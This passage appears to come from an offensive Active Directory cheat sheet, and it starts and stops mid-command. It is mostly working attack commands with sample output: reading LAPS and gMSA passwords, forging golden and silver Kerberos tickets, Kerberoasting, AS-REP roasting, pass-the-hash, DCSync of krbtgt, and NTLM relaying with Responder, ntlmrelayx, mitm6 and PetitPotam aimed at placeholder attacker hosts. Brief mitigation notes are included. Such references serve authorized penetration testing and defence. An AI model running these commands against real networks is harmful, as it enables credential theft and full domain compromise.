\u0026#39;domain.local\u0026#39; python laps.py -u \u0026#39;user\u0026#39; -p \u0026#39;e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c\u0026#39; -d \u0026#39;domain.local\u0026#39; -l \u0026#39;dc01.domain.local\u0026#39; ldapsearch\nldapsearch -x -h -D \u0026#34;@\u0026#34; -w -b \u0026#34;dc=\u0026lt;\u0026gt;,dc=\u0026lt;\u0026gt;,dc=\u0026lt;\u0026gt;\u0026#34; \u0026#34;(\u0026amp;(objectCategory=computer)(ms-MCS-AdmPwd=*))\u0026#34; ms-MCS-AdmPwd` Grant LAPS Access # The members of the group \u0026ldquo;Account Operator\u0026rdquo; can add and modify all the non admin users and groups. Since LAPS ADM and LAPS READ are considered as non admin groups, it\u0026rsquo;s possible to add an user to them, and read the LAPS admin password\nAdd-DomainGroupMember -Identity \u0026#39;LAPS ADM\u0026#39; -Members \u0026#39;user1\u0026#39; -Credential $cred -Domain \u0026#34;domain.local\u0026#34; Add-DomainGroupMember -Identity \u0026#39;LAPS READ\u0026#39; -Members \u0026#39;user1\u0026#39; -Credential $cred -Domain \u0026#34;domain.local\u0026#34; Reading GMSA Password # User accounts created to be used as service accounts rarely have their password changed. Group Managed Service Accounts (GMSAs) provide a better approach (starting in the Windows 2012 timeframe). The password is managed by AD and automatically rotated every 30 days to a randomly generated password of 256 bytes.\nGMSA Attributes in the Active Directory # msDS-GroupMSAMembership (PrincipalsAllowedToRetrieveManagedPassword) - stores the security principals that can access the GMSA password. msds-ManagedPassword - This attribute contains a BLOB with password information for group-managed service accounts. msDS-ManagedPasswordId - This constructed attribute contains the key identifier for the current managed password data for a group MSA. msDS-ManagedPasswordInterval - This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA. Extract NT hash from the Active Directory # GMSAPasswordReader (C#)\n# https://github.com/rvazarkar/GMSAPasswordReader GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT gMSADumper (Python)\n# https://github.com/micahvandeusen/gMSADumper python3 gMSADumper.py -u User -p Password1 -d domain.local Active Directory Powershell\n$gmsa = Get-ADServiceAccount -Identity \u0026#39;SVC_SERVICE_ACCOUNT\u0026#39; -Properties \u0026#39;msDS-ManagedPassword\u0026#39; $blob = $gmsa.\u0026#39;msDS-ManagedPassword\u0026#39; $mp = ConvertFrom-ADManagedPasswordBlob $blob $hash1 = ConvertTo-NTHash -Password $mp.SecureCurrentPassword gMSA_Permissions_Collection.ps1 based on Active Directory PowerShell module\nForging Golden GMSA # One notable difference between a Golden Ticket attack and the Golden GMSA attack is that they no way of rotating the KDS root key secret. Therefore, if a KDS root key is compromised, there is no way to protect the gMSAs associated with it.\nUsing GoldenGMSA # Enumerate all gMSAs GoldenGMSA.exe gmsainfo # Query for a specific gMSA GoldenGMSA.exe gmsainfo --sid S-1-5-21-1437000690-1664695696-1586295871-1112 # Dump all KDS Root Keys GoldenGMSA.exe kdsinfo # Dump a specific KDS Root Key GoldenGMSA.exe kdsinfo --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb # Compute gMSA password # --sid \u0026lt;gMSA SID\u0026gt;: SID of the gMSA (required) # --kdskey \u0026lt;Base64-encoded blob\u0026gt;: Base64 encoded KDS Root Key # --pwdid \u0026lt;Base64-encoded blob\u0026gt;: Base64 of msds-ManagedPasswordID attribute value GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 # requires privileged access to the domain GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45UZXyuYB[...]G2/M= # requires LDAP access GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45U[...]SM0R7djG2/M= --pwdid AQAAA[..]AAA # Offline mode Pass-the-Ticket Golden Tickets # Forging a TGT require the krbtgt NTLM hash\nThe way to forge a Golden Ticket is very similar to the Silver Ticket one. The main differences are that, in this case, no service SPN must be specified to ticketer.py, and the krbtgt ntlm hash must be used.\nUsing Mimikatz # # Get info - Mimikatz lsadump::lsa /inject /name:krbtgt lsadump::lsa /patch lsadump::trust /patch lsadump::dcsync /user:krbtgt # Forge a Golden ticket - Mimikatz kerberos::purge kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt kerberos::tgt Using Meterpreter # # Get info - Meterpreter(kiwi) dcsync_ntlm krbtgt dcsync krbtgt # Forge a Golden ticket - Meterpreter load kiwi golden_ticket_create -d \u0026lt;domainname\u0026gt; -k \u0026lt;nthashof krbtgt\u0026gt; -s \u0026lt;SID without le RID\u0026gt; -u \u0026lt;user_for_the_ticket\u0026gt; -t \u0026lt;location_to_store_tck\u0026gt; golden_ticket_create -d pentestlab.local -u pentestlabuser -s S-1-5-21-3737340914-2019594255-2413685307 -k d125e4f69c851529045ec95ca80fa37e -t /root/Downloads/pentestlabuser.tck kerberos_ticket_purge kerberos_ticket_use /root/Downloads/pentestlabuser.tck kerberos_ticket_list Using a ticket on Linux # # Convert the ticket kirbi to ccache with kekeo misc::convert ccache ticket.kirbi # Alternatively you can use ticketer from Impacket ./ticketer.py -nthash a577fcf16cfef780a2ceb343ec39a0d9 -domain-sid S-1-5-21-2972629792-1506071460-1188933728 -domain amity.local mbrody-da ticketer.py -nthash HASHKRBTGT -domain-sid SID_DOMAIN_A -domain DEV Administrator -extra-sid SID_DOMAIN_B_ENTERPRISE_519 ./ticketer.py -nthash e65b41757ea496c2c60e82c05ba8b373 -domain-sid S-1-5-21-354401377-2576014548-1758765946 -domain DEV Administrator -extra-sid S-1-5-21-2992845451-2057077057-2526624608-519 export KRB5CCNAME=/home/user/ticket.ccache cat $KRB5CCNAME # NOTE: You may need to comment the proxy_dns setting in the proxychains configuration file ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 If you need to swap ticket between Windows and Linux, you need to convert them with ticket_converter or kekeo.\nroot@kali:ticket_converter$ python ticket_converter.py velociraptor.ccache velociraptor.kirbi Converting ccache =\u0026gt; kirbi root@kali:ticket_converter$ python ticket_converter.py velociraptor.kirbi velociraptor.ccache Converting kirbi =\u0026gt; ccache Mitigations:\nHard to detect because they are legit TGT tickets Mimikatz generate a golden ticket with a life-span of 10 years Pass-the-Ticket Silver Tickets # Forging a Service Ticket (ST) require machine account password (key) or NT hash of the service account.\n# Create a ticket for the service mimikatz $ kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:TARGET-HOST.DOMAIN.FQDN /rc4:TARGET-MACHINE-NT-HASH /service:SERVICE # Examples mimikatz $ /kerberos::golden /domain:adsec.local /user:ANY /sid:S-1-5-21-1423455951-1752654185-1824483205 /rc4:ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /target:DESKTOP-01.adsec.local /service:cifs /ptt mimikatz $ kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park # Then use the same steps as a Golden ticket mimikatz $ misc::convert ccache ticket.kirbi root@kali:/tmp$ export KRB5CCNAME=/home/user/ticket.ccache root@kali:/tmp$ ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 Interesting services to target with a silver ticket :\nService Type Service Silver Tickets Attack WMI HOST + RPCSS wmic.exe /authority:\u0026quot;kerberos:DOMAIN\\DC01\u0026quot; /node:\u0026quot;DC01\u0026quot; process call create \u0026quot;cmd /c evil.exe\u0026quot; PowerShell Remoting CIFS + HTTP + (wsman?) New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC WinRM HTTP + wsman New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC Scheduled Tasks HOST schtasks /create /s dc01 /SC WEEKLY /RU \u0026quot;NT Authority\\System\u0026quot; /IN \u0026quot;SCOM Agent Health Check\u0026quot; /IR \u0026quot;C:/shell.ps1\u0026quot; Windows File Share (CIFS) CIFS dir \\\\dc01\\c$ LDAP operations including Mimikatz DCSync LDAP lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt Windows Remote Server Administration Tools RPCSS + LDAP + CIFS / Mitigations:\nSet the attribute \u0026ldquo;Account is Sensitive and Cannot be Delegated\u0026rdquo; to prevent lateral movement with the generated ticket. Kerberoasting # \u0026ldquo;A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. \u0026quot; - MSDN\nAny valid domain user can request a kerberos ticket (ST) for any domain service. Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as.\nGetUserSPNs from Impacket Suite\n$ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies ServicePrincipalName Name MemberOf PasswordLastSet LastLogon -------------------- ------------- -------------------------------------------------------- ------------------- ------------------- active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 21:06:40 2018-12-03 17:11:11 $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$424338c0a3c3af43[...]84fd2 CrackMapExec Module\n$ crackmapexec ldap 10.0.2.11 -u \u0026#39;username\u0026#39; -p \u0026#39;password\u0026#39; --kdcHost 10.0.2.11 --kerberoast output.txt LDAP 10.0.2.11 389 dc01 [*] Windows 10.0 Build 17763 x64 (name:dc01) (domain:lab.local) (signing:True) (SMBv1:False) LDAP 10.0.2.11 389 dc01 $krb5tgs$23$*john.doe$lab.local$MSSQLSvc/dc01.lab.local~1433*$efea32[...]49a5e82$b28fc61[...]f800f6dcd259ea1fca8f9 Rubeus\n# Stats Rubeus.exe kerberoast /stats ------------------------------------- ---------------------------------- | Supported Encryption Type | Count | | Password Last Set Year | Count | ------------------------------------- ---------------------------------- | RC4_HMAC_DEFAULT | 1 | | 2021 | 1 | ------------------------------------- ---------------------------------- # Kerberoast (RC4 ticket) Rubeus.exe kerberoast /creduser:DOMAIN\\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt # Kerberoast (AES ticket) # Accounts with AES enabled in msDS-SupportedEncryptionTypes will have RC4 tickets requested. Rubeus.exe kerberoast /tgtdeleg # Kerberoast (RC4 ticket) # The tgtdeleg trick is used, and accounts without AES enabled are enumerated and roasted. Rubeus.exe kerberoast /rc4opsec PowerView\nRequest-SPNTicket -SPN \u0026#34;MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local\u0026#34; bifrost on macOS machine\n./bifrost -action asktgs -ticket doIF\u0026lt;...snip...\u0026gt;QUw= -service host/dc1-lab.lab.local -kerberoast true targetedKerberoast\n# for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute), # print the \u0026#34;kerberoast\u0026#34; hash, and delete the temporary SPN set for that operation targetedKerberoast.py [-h] [-v] [-q] [-D TARGET_DOMAIN] [-U USERS_FILE] [--request-user username] [-o OUTPUT_FILE] [--use-ldaps] [--only-abuse] [--no-abuse] [--dc-ip ip address] [-d DOMAIN] [-u USER] [-k] [--no-pass | -p PASSWORD | -H [LMHASH:]NTHASH | --aes-key hex key] Then crack the ticket using the correct hashcat mode ($krb5tgs$23= etype 23)\nMode Description 13100 Kerberos 5 TGS-REP etype 23 (RC4) 19600 Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96) 19700 Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96) ./hashcat -m 13100 -a 0 kerberos_hashes.txt crackstation.txt ./john --wordlist=/opt/wordlists/rockyou.txt --fork=4 --format=krb5tgs ~/kerberos_hashes.txt Mitigations:\nHave a very long password for your accounts with SPNs (\u0026gt; 32 characters) Make sure no users have SPNs KRB_AS_REP Roasting # If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la kerberoasting\nRequirements:\nAccounts with the attribute DONT_REQ_PREAUTH (PowerView \u0026gt; Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose) Rubeus\nC:\\Rubeus\u0026gt;Rubeus.exe asreproast /user:TestOU3user /format:hashcat /outfile:hashes.asreproast [*] Action: AS-REP roasting [*] Target User : TestOU3user [*] Target Domain : testlab.local [*] SamAccountName : TestOU3user [*] DistinguishedName : CN=TestOU3user,OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local [*] Using domain controller: testlab.local (192.168.52.100) [*] Building AS-REQ (w/o preauth) for: \u0026#39;testlab.local\\TestOU3user\u0026#39; [*] Connecting to 192.168.52.100:88 [*] Sent 169 bytes [*] Received 1437 bytes [+] AS-REQ w/o preauth successful! [*] AS-REP hash: $krb5asrep$TestOU3user@testlab.local:858B6F645D9F9B57210292E5711E0...(snip)... GetNPUsers from Impacket Suite\n$ python GetNPUsers.py htb.local/svc-alfresco -no-pass [*] Getting TGT for svc-alfresco $krb5asrep$23$svc-alfresco@HTB.LOCAL:c13528009a59be0a634bb9b8e84c88ee$cb8e87d02bd0ac7a[...]e776b4 # extract hashes root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast CrackMapExec Module\n$ crackmapexec ldap 10.0.2.11 -u \u0026#39;username\u0026#39; -p \u0026#39;password\u0026#39; --kdcHost 10.0.2.11 --asreproast output.txt LDAP 10.0.2.11 389 dc01 $krb5asrep$23$john.doe@LAB.LOCAL:5d1f750[...]2a6270d7$096fc87726c64e545acd4687faf780[...]13ea567d5 Using hashcat or john to crack the ticket.\n# crack AS_REP messages with hashcat root@kali:impacket-examples$ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt root@windows:hashcat$ hashcat64.exe -m 18200 \u0026#39;\u0026lt;AS_REP-hash\u0026gt;\u0026#39; -a 0 c:\\wordlists\\rockyou.txt # crack AS_REP messages with john C:\\Rubeus\u0026gt; john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast Mitigations:\nAll accounts must have \u0026ldquo;Kerberos Pre-Authentication\u0026rdquo; enabled (Enabled by Default). Pass-the-Hash # The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes. Since Windows Vista, attackers have been unable to pass-the-hash to local admin accounts that weren’t the built-in RID 500.\nMetasploit use exploit/windows/smb/psexec set RHOST 10.2.0.3 set SMBUser jarrieta set SMBPass nastyCutt3r # NOTE1: The password can be replaced by a hash to execute a `pass the hash` attack. # NOTE2: Require the full NTLM hash, you may need to add the \u0026#34;blank\u0026#34; LM (aad3b435b51404eeaad3b435b51404ee) set PAYLOAD windows/meterpreter/bind_tcp run shell CrackMapExec cme smb 10.2.0.2/24 -u jarrieta -H \u0026#39;aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d\u0026#39; -x \u0026#34;whoami\u0026#34; Impacket suite proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b975356693e179d Windows RDP and mimikatz sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:b73fdfe10e87b4ca5c0d957f81de6863 sekurlsa::pth /user:\u0026lt;user name\u0026gt; /domain:\u0026lt;domain name\u0026gt; /ntlm:\u0026lt;the users ntlm hash\u0026gt; /run:\u0026#34;mstsc.exe /restrictedadmin\u0026#34; You can extract the local SAM database to find the local administrator hash :\nC:\\\u0026gt; reg.exe save hklm\\sam c:\\temp\\sam.save C:\\\u0026gt; reg.exe save hklm\\security c:\\temp\\security.save C:\\\u0026gt; reg.exe save hklm\\system c:\\temp\\system.save $ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL OverPass-the-Hash (pass the key) # In this technique, instead of passing the hash directly, we use the NTLM hash of an account to request a valid Kerberost ticket (TGT).\nUsing impacket # root@kali:~$ python ./getTGT.py -hashes \u0026#34;:1a59bd44fe5bec39c44c8cd3524dee\u0026#34; lab.ropnop.com root@kali:~$ export KRB5CCNAME=\u0026#34;/root/impacket-examples/velociraptor.ccache\u0026#34; root@kali:~$ python3 psexec.py \u0026#34;jurassic.park/velociraptor@labwws02.jurassic.park\u0026#34; -k -no-pass # also with the AES Key if you have it root@kali:~$ ./getTGT.py -aesKey xxxxxxxxxxxxxxkeyaesxxxxxxxxxxxxxxxx lab.ropnop.com root@kali:~$ ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hma-md5 -w 1a59bd44fe5bec39c44c8cd3524dee --hex -V 5 root@kali:~$ kinit -t ~/mykers tgwynn@LAB.ROPNOP.COM root@kali:~$ klist Using Rubeus # # Request a TGT as the target user and pass it into the current session # NOTE: Make sure to clear tickets in the current session (with \u0026#39;klist purge\u0026#39;) to ensure you don\u0026#39;t have multiple active TGTs .\\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt # More stealthy variant, but requires the AES256 hash .\\Rubeus.exe asktgt /user:Administrator /aes256:[AES256HASH] /opsec /ptt # Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation) .\\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\\Windows\\System32\\cmd.exe Capturing and cracking Net-NTLMv1/NTLMv1 hashes # Net-NTLM (NTLMv1) hashes are used for network authentication (they are derived from a challenge/response algorithm and are based on the user\u0026rsquo;s NT hash.\n:information_source: : Coerce a callback using PetitPotam or SpoolSample on an affected machine and downgrade the authentication to NetNTLMv1 Challenge/Response authentication. This uses the outdated encryption method DES to protect the NT/LM Hashes.\nRequirements:\nLmCompatibilityLevel = 0x1: Send LM \u0026amp; NTLM (reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v lmcompatibilitylevel) Exploitation:\nCapturing using Responder: Edit the /etc/responder/Responder.conf file to include the magical 1122334455667788 challenge HTTPS = On DNS = On LDAP = On ... ; Custom challenge. ; Use \u0026#34;Random\u0026#34; for generating a random challenge for each requests (Default) Challenge = 1122334455667788 Fire Responder: responder -I eth0 --lm, if --disable-ess is set, extended session security will be disabled for NTLMv1 authentication Force a callback: PetitPotam.exe Responder-IP DC-IP # Patched around August 2021 PetitPotam.py -u Username -p Password -d Domain -dc-ip DC-IP Responder-IP DC-IP # Not patched for authenticated users If you got some NTLMv1 hashes, you need to format them to submit them on crack.sh username::hostname:response:response:challenge -\u0026gt; NTHASH:response NTHASH:F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972 Or crack them with Hashcat / John The Ripper john --format=netntlm hash.txt hashcat -m 5500 -a 3 hash.txt Now you can DCSync using the Pass-The-Hash with the DC machine account :warning: NTLMv1 with SSP(Security Support Provider) changes the server challenge and is not quite ideal for the attack, but it can be used.\nMitigations:\nSet the Lan Manager authentication level to Send NTLMv2 responses only. Refuse LM \u0026amp; NTLM Capturing and cracking Net-NTLMv2/NTLMv2 hashes # If any user in the network tries to access a machine and mistype the IP or the name, Responder will answer for it and ask for the NTLMv2 hash to access the resource. Responder will poison LLMNR, MDNS and NETBIOS requests on the network.\n# https://github.com/lgandx/Responder $ sudo ./Responder.py -I eth0 -wfrd -P -v # https://github.com/Kevin-Robertson/InveighZero PS \u0026gt; .\\inveighzero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y [-Elevated N] # https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Invoke-Inveigh.ps1 PS \u0026gt; Invoke-Inveigh [-IP \u0026#39;10.10.10.10\u0026#39;] -ConsoleOutput Y -FileOutput Y -NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y Crack the hashes with Hashcat / John The Ripper\njohn --format=netntlmv2 hash.txt hashcat -m 5600 -a 3 hash.txt Man-in-the-Middle attacks \u0026amp; relaying # NTLMv1 and NTLMv2 can be relayed to connect to another machine.\nHash Hashcat Attack method LM 3000 crack/pass the hash NTLM/NTHash 1000 crack/pass the hash NTLMv1/Net-NTLMv1 5500 crack/relay attack NTLMv2/Net-NTLMv2 5600 crack/relay attack Crack the hash with hashcat.\nhashcat -m 5600 -a 0 hash.txt crackstation.txt MS08-068 NTLM reflection # NTLM reflection vulnerability in the SMB protocolOnly targeting Windows 2000 to Windows Server 2008.\nThis vulnerability allows an attacker to redirect an incoming SMB connection back to the machine it came from and then access the victim machine using the victim’s own credentials.\nhttps://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-068 msf \u0026gt; use exploit/windows/smb/smb_relay msf exploit(smb_relay) \u0026gt; show targets SMB Signing Disabled and IPv4 # If a machine has SMB signing:disabled, it is possible to use Responder with Multirelay.py script to perform an NTLMv2 hashes relay and get a shell access on the machine. Also called LLMNR/NBNS Poisoning\nOpen the Responder.conf file and set the value of SMB and HTTP to Off. [Responder Core] ; Servers to start ... SMB = Off # Turn this off HTTP = Off # Turn this off Run python RunFinger.py -i IP_Range to detect machine with SMB signing:disabled. Run python Responder.py -I \u0026lt;interface_card\u0026gt; Use a relay tool such as ntlmrelayx or MultiRelay impacket-ntlmrelayx -tf targets.txt to dump the SAM database of the targets in the list. python MultiRelay.py -t \u0026lt;target_machine_IP\u0026gt; -u ALL ntlmrelayx can also act as a SOCK proxy with every compromised sessions. $ impacket-ntlmrelayx -tf /tmp/targets.txt -socks -smb2support [*] Servers started, waiting for connections Type help for list of commands ntlmrelayx\u0026gt; socks Protocol Target Username Port -------- -------------- ------------------------ ---- MSSQL 192.168.48.230 VULNERABLE/ADMINISTRATOR 1433 SMB 192.168.48.230 CONTOSO/NORMALUSER1 445 MSSQL 192.168.48.230 CONTOSO/NORMALUSER1 1433 # You might need to select a target with \u0026#34;-t\u0026#34; impacket-ntlmrelayx -t mssql://10.10.10.10 -socks -smb2support impacket-ntlmrelayx -t smb://10.10.10.10 -socks -smb2support # the socks proxy can then be used with your Impacket tools or CrackMapExec $ proxychains impacket-smbclient //192.168.48.230/Users -U contoso/normaluser1 $ proxychains impacket-mssqlclient DOMAIN/USER@10.10.10.10 -windows-auth $ proxychains crackmapexec mssql 10.10.10.10 -u user -p \u0026#39;\u0026#39; -d DOMAIN -q \u0026#34;SELECT 1\u0026#34; Mitigations:\nDisable LLMNR via group policy Open gpedit.msc and navigate to Computer Configuration \u0026gt; Administrative Templates \u0026gt; Network \u0026gt; DNS Client \u0026gt; Turn off multicast name resolution and set to Enabled Disable NBT-NS This can be achieved by navigating through the GUI to Network card \u0026gt; Properties \u0026gt; IPv4 \u0026gt; Advanced \u0026gt; WINS and then under \u0026#34;NetBIOS setting\u0026#34; select Disable NetBIOS over TCP/IP SMB Signing Disabled and IPv6 # Since MS16-077 the location of the WPAD file is no longer requested via broadcast protocols, but only via DNS.\ncrackmapexec smb $hosts --gen-relay-list relay.txt # DNS takeover via IPv6, mitm6 will request an IPv6 address via DHCPv6 # -d is the domain name that we filter our request on - the attacked domain # -i is the interface we have mitm6 listen on for events mitm6 -i eth0 -d $domain # spoofing WPAD and relaying NTLM credentials impacket-ntlmrelayx -6 -wh $attacker_ip -of loot -tf relay.txt impacket-ntlmrelayx -6 -wh $attacker_ip -l /tmp -socks -debug # -ip is the interface you want the relay to run on # -wh is for WPAD host, specifying your wpad file to serve # -t is the target where you want to relay to. impacket-ntlmrelayx -ip 10.10.10.1 -wh $attacker_ip -t ldaps://10.10.10.2 Drop the MIC # The CVE-2019-1040 vulnerability makes it possible to modify the NTLM authentication packets without invalidating the authentication, and thus enabling an attacker to remove the flags which would prevent relaying from SMB to LDAP\nCheck vulnerability with cve-2019-1040-scanner\npython2 scanMIC.py \u0026#39;DOMAIN/USERNAME:PASSWORD@TARGET\u0026#39; [*] CVE-2019-1040 scanner by @_dirkjan / Fox-IT - Based on impacket by SecureAuth [*] Target TARGET is not vulnerable to CVE-2019-1040 (authentication was rejected) Using any AD account, connect over SMB to a victim Exchange server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant DCSync privileges to the attacker account. The attacker account can now use DCSync to dump all password hashes in AD\nTERM1\u0026gt; python printerbug.py testsegment.local/username@s2012exc.testsegment.local \u0026lt;attacker ip/hostname\u0026gt; TERM2\u0026gt; ntlmrelayx.py --remove-mic --escalate-user ntu -t ldap://s2016dc.testsegment.local -smb2support TERM1\u0026gt; secretsdump.py testsegment/ntu@s2016dc.testsegment.local -just-dc Using any AD account, connect over SMB to the victim server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant Resource Based Constrained Delegation privileges for the victim server to a computer account under the control of the attacker. The attacker can now authenticate as any user on the victim server.\n# create a new machine account TERM1\u0026gt; ntlmrelayx.py -t ldaps://rlt-dc.relaytest.local --remove-mic --delegate-access -smb2support TERM2\u0026gt; python printerbug.py relaytest.local/username@second-dc-server 10.0.2.6 TERM1\u0026gt; getST.py -spn host/second-dc-server.local \u0026#39;relaytest.local/MACHINE$:PASSWORD\u0026#39; -impersonate DOMAIN_ADMIN_USER_NAME # connect using the ticket export KRB5CCNAME=DOMAIN_ADMIN_USER_NAME.ccache secretsdump.py -k -no-pass second-dc-server.local -just-dc Ghost Potato - CVE-2019-1384 # Requirements:\nUser must be a member of the local Administrators group User must be a member of the Backup Operators group Token must be elevated Using a modified version of ntlmrelayx : https://shenaniganslabs.io/files/impacket-ghostpotato.zip\nntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe RemotePotato0 DCOM DCE RPC relay # It abuses the DCOM activation service and trigger an NTLM authentication of the user currently logged on in the target machine\nRequirements:\na shell in session 0 (e.g. WinRm shell or SSH shell) a privileged user is logged on in the session 1 (e.g. a Domain Admin user) # https://github.com/antonioCoco/RemotePotato0/ Terminal\u0026gt; sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 \u0026amp; # Can be omitted for Windows Server \u0026lt;= 2016 Terminal\u0026gt; sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user winrm_user_1 Session0\u0026gt; RemotePotato0.exe -r 192.168.83.130 -p 9998 -s 2 Terminal\u0026gt; psexec.py \u0026#39;LAB/winrm_user_1:Password123!@192.168.83.135\u0026#39; DNS Poisonning - Relay delegation with mitm6 # Requirements:\nIPv6 enabled (Windows prefers IPV6 over IPv4) LDAP over TLS (LDAPS) ntlmrelayx relays the captured credentials to LDAP on the domain controller, uses that to create a new machine account, print the account\u0026rsquo;s name and password and modifies the delegation rights of it.\ngit clone https://github.com/fox-it/mitm6.git cd /opt/tools/mitm6 pip install . mitm6 -hw ws02 -d lab.local --ignore-nofqnd # -d: the domain name that we filter our request on (the attacked domain) # -i: the interface we have mitm6 listen on for events # -hw: host whitelist ntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad ntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad --add-computer # -ip: the interface you want the relay to run on # -wh: WPAD host, specifying your wpad file to serve # -t: the target where you want to relay to # now granting delegation rights and then do a RBCD ntlmrelayx.py -t ldaps://dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad getST.py -spn cifs/target.lab.local lab.local/GENERATED\\$ -impersonate Administrator export KRB5CCNAME=administrator.ccache secretsdump.py -k -no-pass target.lab.local Relaying with WebDav Trick # Example of exploitation where you can coerce machine accounts to authenticate to a host and combine it with Resource Based Constrained Delegation to gain elevated access. It allows attackers to elicit authentications made over HTTP instead of SMB\nRequirement:\nWebClient service Exploitation:\nDisable HTTP in Responder: sudo vi /usr/share/responder/Responder.conf Generate a Windows machine name: sudo responder -I eth0, e.g: WIN-UBNW4FI3AP0 Prepare for RBCD against the DC: python3 ntlmrelayx.py -t ldaps://dc --delegate-access -smb2support Discover WebDAV services webclientservicescanner \u0026#39;domain.local\u0026#39;/\u0026#39;user\u0026#39;:\u0026#39;password\u0026#39;@\u0026#39;machine\u0026#39; crackmapexec smb \u0026#39;TARGETS\u0026#39; -d \u0026#39;domain\u0026#39; -u \u0026#39;user\u0026#39; -p \u0026#39;password\u0026#39; -M webdav GetWebDAVStatus.exe \u0026#39;machine\u0026#39; Trigger the authentication to relay to our nltmrelayx: PetitPotam.exe WIN-UBNW4FI3AP0@80/test.txt 10.0.0.4, the listener host must be specified with the FQDN or full netbios name like logger.domain.local@80/test.txt. Specifying the IP results in anonymous auth instead of System. # PrinterBug dementor.py -d \u0026#34;DOMAIN\u0026#34; -u \u0026#34;USER\u0026#34; -p \u0026#34;PASSWORD\u0026#34; \u0026#34;ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\u0026#34; \u0026#34;ATTACKER_IP\u0026#34; SpoolSample.exe \u0026#34;ATTACKER_IP\u0026#34; \u0026#34;ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\u0026#34; # PetitPotam Petitpotam.py \u0026#34;ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\u0026#34; \u0026#34;ATTACKER_IP\u0026#34; Petitpotam.py -d \u0026#34;DOMAIN\u0026#34; -u \u0026#34;USER\u0026#34; -p \u0026#34;PASSWORD\u0026#34; \u0026#34;ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\u0026#34; \u0026#34;ATTACKER_IP\u0026#34; PetitPotam.exe \u0026#34;ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\u0026#34; \u0026#34;ATTACKER_IP\u0026#34; Use the created account to ask for a service ticket: .\\Rubeus.exe hash /domain:purple.lab /user:WVLFLLKZ$ 